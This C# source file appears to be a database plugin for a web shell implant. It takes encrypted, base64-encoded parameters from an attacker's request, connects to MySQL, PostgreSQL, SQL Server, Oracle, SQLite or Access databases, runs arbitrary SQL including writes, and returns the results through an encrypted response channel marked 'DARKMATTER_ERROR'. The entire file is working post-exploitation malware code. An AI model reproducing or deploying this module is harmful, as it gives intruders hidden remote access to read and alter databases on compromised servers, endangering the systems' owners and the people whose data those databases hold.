using System;
using System.Web;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Reflection;
using System.Data;

public class db_query
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();

            try
            {
                string szDsnURL = fnB64Decode(dic["z0"]);
                string szSQL = fnB64Decode(dic["z1"]);

                sb.Append(fnProcessDatabaseRequest(szDsnURL, szSQL));
            }
            catch (Exception ex)
            {
                // 錯誤時輸出符合 clsQueryResponse 的結構
                sb.Append(string.Format("{{\"success\":false,\"rowCount\":0,\"data\":[],\"error\":\"{0}\"}}", fnEscapeJson(ex.Message)));
            }

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }

    private string fnProcessDatabaseRequest(string dsnUrl, string sql)
    {
        string connectionString = "";
        string dbType = dsnUrl.Split(new string[] { "://" }, StringSplitOptions.None)[0].ToLower();

        string className = "";
        
        if (dbType == "mysql" || dbType == "pgsql" || dbType == "postgresql" || dbType == "oracle" || dbType == "sqlsrv")
        {
            string rest = dsnUrl.Substring(dsnUrl.IndexOf("://") + 3);
            
            string user = "";
            string pass = "";
            string hostPortDb = rest;

            int atIndex = rest.LastIndexOf('@');
            if (atIndex >= 0)
            {
                string userInfo = rest.Substring(0, atIndex);
                hostPortDb = rest.Substring(atIndex + 1);
                
                string[] up = userInfo.Split(':');
                user = up[0];
                if (up.Length > 1) pass = up[1];
            }

            string host = "";
            int port = -1;
            string database = "";

            int slashIndex = hostPortDb.IndexOf('/');
            if (slashIndex >= 0)
            {
                database = hostPortDb.Substring(slashIndex + 1);
                host = hostPortDb.Substring(0, slashIndex);
            }
            else
            {
                host = hostPortDb;
            }

            int colonIndex = host.LastIndexOf(':');
            if (colonIndex >= 0 && !host.EndsWith(")"))
            {
                if (int.TryParse(host.Substring(colonIndex + 1), out int parsedPort))
                {
                    port = parsedPort;
                    host = host.Substring(0, colonIndex);
                }
            }

            switch (dbType)
            {
                case "mysql":
                    className = "MySql.Data.MySqlClient.MySqlConnection";
                    connectionString = string.Format("Server={0};Port={1};Database={2};Uid={3};Pwd={4};SslMode=none;", host, port == -1 ? 3306 : port, database, user, pass);
                    break;
                case "pgsql":
                case "postgresql":
                    className = "Npgsql.NpgsqlConnection";
                    connectionString = string.Format("Host={0};Port={1};Database={2};Username={3};Password={4};", host, port == -1 ? 5432 : port, database, user, pass);
                    break;
                case "sqlsrv":
                    className = "System.Data.SqlClient.SqlConnection";
                    connectionString = string.Format("Server={0}{1};Database={2};User ID={3};Password={4};Encrypt=false;TrustServerCertificate=True;", 
                        host, 
                        port == -1 ? "" : "," + port, 
                        database, 
                        user, 
                        pass);
                    break;
                case "oracle":
                    className = "Oracle.ManagedDataAccess.Client.OracleConnection";
                    connectionString = string.Format("Data Source=(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={0})(PORT={1}))(CONNECT_DATA=(SERVICE_NAME={2})));User Id={3};Password={4};", host, port == -1 ? 1521 : port, database, user, pass);
                    break;
            }
        }
        else if (dbType == "sqlite")
        {
            className = "System.Data.SQLite.SQLiteConnection";
            string sqlitePath = dsnUrl.Substring(9);
            if (!File.Exists(sqlitePath))
                throw new Exception("SQLite file not found: " + sqlitePath);

            connectionString = string.Format("Data Source={0};Version=3;", sqlitePath);
        }
        else if (dbType == "access")
        {
            className = "System.Data.OleDb.OleDbConnection";
            string accessContent = dsnUrl.Substring(9);
            string[] parts = accessContent.Split(';');
            string accessPath = parts[0];
            if (!File.Exists(accessPath))
                throw new Exception("Access file not found: " + accessPath);

            string accessPwd = "";
            foreach (string part in parts)
            {
                if (part.ToLower().StartsWith("password=") || part.ToLower().StartsWith("pwd="))
                    accessPwd = part.Split('=')[1];
            }
            connectionString = string.Format("Provider=Microsoft.ACE.OLEDB.12.0;Data Source={0};", accessPath);
            if (!string.IsNullOrEmpty(accessPwd)) connectionString += "Jet OLEDB:Database Password=" + accessPwd + ";";
        }
        else
        {
            throw new Exception("Unsupported database type: " + dbType);
        }

        Type connType = fnGetClassType(className);
        if (connType == null)
            throw new Exception("Missing ADO.NET driver dependency: " + className);

        using (IDbConnection conn = (IDbConnection)Activator.CreateInstance(connType, new object[] { connectionString }))
        {
            conn.Open();

            if (string.IsNullOrEmpty(sql.Trim()))
                return "{\"success\":true,\"rowCount\":0,\"data\":[],\"error\":null}";

            using (IDbCommand cmd = conn.CreateCommand())
            {
                cmd.CommandText = sql;

                string trimmedSql = sql.Trim().ToLower();
                bool isQuery = trimmedSql.StartsWith("select") || trimmedSql.StartsWith("show") || trimmedSql.StartsWith("exec") || trimmedSql.StartsWith("with");

                if (isQuery)
                {
                    using (IDataReader reader = cmd.ExecuteReader())
                    {
                        List<string> jsonRows = new List<string>();
                        
                        int columns = reader.FieldCount;
                        string[] columnNames = new string[columns];
                        for (int i = 0; i < columns; i++)
                        {
                            columnNames[i] = reader.GetName(i);
                        }

                        while (reader.Read())
                        {
                            Dictionary<string, object> row = new Dictionary<string, object>();
                            for (int i = 0; i < columns; i++)
                            {
                                object val = reader.GetValue(i);
                                row[columnNames[i]] = (val == DBNull.Value) ? null : val;
                            }
                            jsonRows.Add(fnMapToJsonObject(row));
                        }

                        // 補上 error: null
                        return string.Format("{{\"success\":true,\"rowCount\":{0},\"data\":[{1}],\"error\":null}}", jsonRows.Count, string.Join(",", jsonRows.ToArray()));
                    }
                }
                else
                {
                    int updateCount = cmd.ExecuteNonQuery();
                    // 補上 error: null
                    return string.Format("{{\"success\":true,\"rowCount\":{0},\"data\":[],\"error\":null}}", updateCount);
                }
            }
        }
    }

    private Type fnGetClassType(string szClassName)
    {
        Type type = Type.GetType(szClassName);
        if (type != null)
            return type;

        foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
        {
            type = assembly.GetType(szClassName);
            if (type != null)
                return type;
        }

        return null;
    }

    private string fnMapToJsonObject(Dictionary<string, object> map)
    {
        List<string> pairs = new List<string>();
        foreach (KeyValuePair<string, object> entry in map)
        {
            string val;
            if (entry.Value == null)
            {
                val = "null";
            }
            else if (entry.Value is bool)
            {
                val = entry.Value.ToString().ToLower();
            }
            else if (entry.Value is int || entry.Value is long || entry.Value is double || entry.Value is float || entry.Value is decimal)
            {
                val = entry.Value.ToString();
            }
            else
            {
                val = "\"" + fnEscapeJson(entry.Value.ToString()) + "\"";
            }
            pairs.Add("\"" + fnEscapeJson(entry.Key) + "\":" + val);
        }

        return "{" + string.Join(",", pairs.ToArray()) + "}";
    }

    private static string fnEscapeJson(string str)
    {
        if (string.IsNullOrEmpty(str))
            return "";

        StringBuilder sb = new StringBuilder();
        foreach (char c in str)
        {
            switch (c)
            {
                case '\"':
                    sb.Append("\\\"");
                    break;
                case '\\':
                    sb.Append("\\\\");
                    break;
                case '\b':
                    sb.Append("\\b");
                    break;
                case '\f':
                    sb.Append("\\f");
                    break;
                case '\n':
                    sb.Append("\\n");
                    break;
                case '\r':
                    sb.Append("\\r");
                    break;
                case '\t':
                    sb.Append("\\t");
                    break;
                default:
                    if (c < ' ')
                    {
                        sb.AppendFormat("\\u{0:x4}", (int)c);
                    }
                    else
                    {
                        sb.Append(c);
                    }
                    break;
            }
        }
        return sb.ToString();
    }
}